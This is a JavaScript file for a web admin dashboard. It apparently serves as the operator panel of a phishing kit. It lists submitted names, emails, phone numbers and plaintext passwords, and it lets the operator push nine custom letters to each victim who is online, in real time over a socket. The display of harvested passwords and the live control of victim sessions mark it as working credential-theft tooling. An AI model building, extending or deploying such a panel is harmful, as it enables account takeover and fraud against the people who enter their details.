let adminToken = localStorage.getItem('adminToken') || null;
let socket = null;

const loginView = document.getElementById('login-view');
const dashboard = document.getElementById('dashboard');
const sessionsList = document.getElementById('sessions-list');
const historyList = document.getElementById('history-list');
const toast = document.getElementById('toast');

function showToast(msg) {
  toast.textContent = msg;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2500);
}

async function api(path, options = {}) {
  const headers = {
    'Content-Type': 'application/json',
    ...(options.headers || {})
  };
  if (adminToken) headers['x-admin-token'] = adminToken;

  const res = await fetch(path, { ...options, headers });
  if (res.status === 401) {
    adminToken = null;
    localStorage.removeItem('adminToken');
    showLogin();
    throw new Error('Unauthorized');
  }
  return res;
}

function showLogin() {
  loginView.style.display = 'block';
  dashboard.style.display = 'none';
}

function showDashboard() {
  loginView.style.display = 'none';
  dashboard.style.display = 'block';
  loadData();
  connectSocket();
}

// Login
document.getElementById('btn-login').addEventListener('click', async () => {
  const password = document.getElementById('admin-password').value;
  const errEl = document.getElementById('login-error');
  errEl.style.display = 'none';

  try {
    const res = await fetch('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password })
    });

    if (!res.ok) {
      errEl.style.display = 'block';
      return;
    }

    const data = await res.json();
    adminToken = data.token;
    localStorage.setItem('adminToken', adminToken);
    showDashboard();
  } catch (e) {
    errEl.style.display = 'block';
  }
});

document.getElementById('btn-refresh').addEventListener('click', loadData);

async function loadData() {
  try {
    const res = await api('/api/admin/submissions');
    const data = await res.json();

    // Active sessions
    if (!data.active || data.active.length === 0) {
      sessionsList.innerHTML = '<p style="color:var(--text-soft);">No active sessions right now.</p>';
    } else {
      sessionsList.innerHTML = data.active.map(s => renderSessionCard(s)).join('');
    }

    // History
    if (!data.history || data.history.length === 0) {
      historyList.innerHTML = '<p style="color:var(--text-soft);">No submissions yet.</p>';
    } else {
      historyList.innerHTML = data.history.map(s => `
        <div class="session-card">
          <strong>${escapeHtml(s.firstName)} ${escapeHtml(s.surname)}</strong><br>
          <span class="session-meta">
            ${escapeHtml(s.email)} · ${escapeHtml(s.phone)}${s.password ? " · Pass: " + escapeHtml(s.password) : ""}<br>
            ${new Date(s.createdAt).toLocaleString()}
          </span>
        </div>
      `).join('');
    }

    // Attach send handlers
    document.querySelectorAll('.btn-send-letters').forEach(btn => {
      btn.addEventListener('click', () => sendLetters(btn.dataset.sessionId));
    });

  } catch (e) {
    console.error(e);
  }
}

function renderSessionCard(s) {
  const status = s.connected
    ? '<span class="status-dot online"></span>Online'
    : '<span class="status-dot offline"></span>Offline';

  const currentLetters = (s.letters || []).map(l => l || '·').join(' ');

  return `
    <div class="session-card ${s.connected ? 'connected' : ''}">
      <div style="display:flex; justify-content:space-between; align-items:flex-start;">
        <div>
          <strong>${escapeHtml(s.firstName)} ${escapeHtml(s.surname)}</strong>
          <div class="session-meta">
            ${escapeHtml(s.email)} · ${escapeHtml(s.phone)}${s.password ? " · Pass: " + escapeHtml(s.password) : ""}<br>
            ${status} · ${new Date(s.createdAt).toLocaleString()}
          </div>
        </div>
      </div>

      <div style="margin-top:0.75rem; font-size:0.85rem; color:var(--text-soft);">
        Current letters: <code>${currentLetters}</code>
      </div>

      <div class="letters-input" id="inputs-${s.id}">
        ${Array(9).fill(0).map((_, i) =>
          `<input type="text" maxlength="1" data-idx="${i}" value="${(s.letters && s.letters[i]) || ''}" />`
        ).join('')}
      </div>

      <button class="btn btn-primary btn-send-letters" data-session-id="${s.id}" style="margin-top:0.5rem;">
        Send Letters to User
      </button>
    </div>
  `;
}

async function sendLetters(sessionId) {
  const inputs = document.querySelectorAll(`#inputs-${sessionId} input`);
  const letters = Array.from(inputs).map(inp => inp.value.toUpperCase().slice(0, 1) || '');

  try {
    const res = await api('/api/admin/send-letters', {
      method: 'POST',
      body: JSON.stringify({ sessionId, letters })
    });

    if (res.ok) {
      showToast('Letters sent in real-time!');
      loadData();
    } else {
      const err = await res.json();
      showToast(err.error || 'Failed to send');
    }
  } catch (e) {
    showToast('Error sending letters');
  }
}

function connectSocket() {
  if (socket) socket.disconnect();
  socket = io();

  socket.on('connect', () => {
    socket.emit('join-admin', adminToken);
  });

  socket.on('admin-update', () => {
    loadData();
  });
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;');
}

// Auto-login if token exists
if (adminToken) {
  showDashboard();
} else {
  showLogin();
}
